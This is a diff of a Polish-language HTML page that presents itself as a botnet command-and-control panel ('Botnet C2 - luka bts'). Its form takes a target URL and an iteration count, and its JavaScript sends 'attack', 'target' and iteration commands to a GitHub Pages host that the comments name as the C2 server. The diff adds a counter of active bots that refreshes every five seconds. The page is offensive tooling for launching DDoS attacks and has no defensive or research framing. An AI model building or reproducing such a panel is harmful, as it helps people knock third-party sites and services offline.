@@ -1,98 +1,120 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Botnet C2 - luka bts</title>
-<style>
-body {
-margin: 0;
-padding: 0;
-background-color: #000;
-color: #0f0;
-font-family: Arial, sans-serif;
-display: flex;
-flex-direction: column;
-align-items: center;
-justify-content: center;
-height: 100vh;
-text-align: center;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Botnet C2 - luka bts</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
 
-h1 {
-font-size: 48px;
-margin-bottom: 20px;
-}
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
 
-p {
-font-size: 20px;
-margin-bottom: 30px;
-}
+        p {
+            font-size: 20px;
+            margin-bottom: 30px;
+        }
 
-form {
-display: flex;
-flex-direction: column;
-gap: 15px;
-width: 100%;
-max-width: 400px;
-}
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            max-width: 400px;
+        }
 
-input, button {
-padding: 10px;
-font-size: 16px;
-border: none;
-border-radius: 5px;
-background-color: #000;
-color: #0f0;
-}
+        input, button {
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #000;
+            color: #0f0;
+        }
 
-input {
-background-color: #111;
-}
+        input {
+            background-color: #111;
+        }
 
-button {
-background-color: #00ff00;
-cursor: pointer;
-}
+        button {
+            background-color: #00ff00;
+            cursor: pointer;
+        }
 
-button:hover {
-background-color: #00cc00;
-}
-</style>
+        button:hover {
+            background-color: #00cc00;
+        }
+
+        #botCount {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
-<h1>Botnet C2 - luka bts</h1>
-<p>Uruchom atak DDoS</p>
+    <h1>Botnet C2 - luka bts</h1>
+    <div id="botCount">Liczba aktywnych botów: <span id="botCountValue">0</span></div>
+    <p>Uruchom atak DDoS</p>
 
-<form id="attackForm">
-<label for="target">Cel ataku:</label>
-<input type="text" id="target" name="target" value="https://atakujesz.com" placeholder="np. https://atakujesz.com" required>
+    <form id="attackForm">
+        <label for="target">Cel ataku:</label>
+        <input type="text" id="target" name="target" value="https://atakujesz.com" placeholder="np. https://atakujesz.com" required>
 
-<label for="iterations">Liczba iteracji:</label>
-<input type="number" id="iterations" name="iterations" value="1000" min="1" required>
+        <label for="iterations">Liczba iteracji:</label>
+        <input type="number" id="iterations" name="iterations" value="1000" min="1" required>
 
-<button type="submit">Uruchom atak</button>
-</form>
+        <button type="submit">Uruchom atak</button>
+    </form>
 
-<script>
-document.getElementById("attackForm").addEventListener("submit", function (e) {
-e.preventDefault();
+    <script>
+        // Pobierz liczbę aktywnych botów
+        function getBotCount() {
+            fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/botcount')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("botCountValue").textContent = data.count;
+                })
+                .catch(error => {
+                    console.error('Błąd podczas pobierania liczby botów:', error);
+                });
+        }
 
-const target = document.getElementById("target").value;
-const iterations = document.getElementById("iterations").value;
+        // Aktualizuj licznik co 5 sekund
+        setInterval(getBotCount, 5000);
+        getBotCount(); // Pobierz raz na początku
 
-// Wysyłanie komend do serwera C2
-fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/attack')
-.then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/target?${target}`))
-.then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/itr?${iterations}`))
-.then(() => {
-alert("Atak zaczął się!");
-})
-.catch(error => {
-console.error('Błąd podczas wysyłania komend:', error);
-alert("Błąd podczas wysyłania komend. Sprawdź adres serwera.");
-});
-});
-</script>
+        document.getElementById("attackForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const target = document.getElementById("target").value;
+            const iterations = document.getElementById("iterations").value;
+
+            // Wysyłanie komend do serwera C2
+            fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/attack')
+                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/target?${target}`))
+                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/itr?${iterations}`))
+                .then(() => {
+                    alert("Atak zaczął się!");
+                })
+                .catch(error => {
+                    console.error('Błąd podczas wysyłania komend:', error);
+                    alert("Błąd podczas wysyłania komend. Sprawdź adres serwera.");
+                });
+        });
+    </script>
 </body>
-</html> 
+</html>
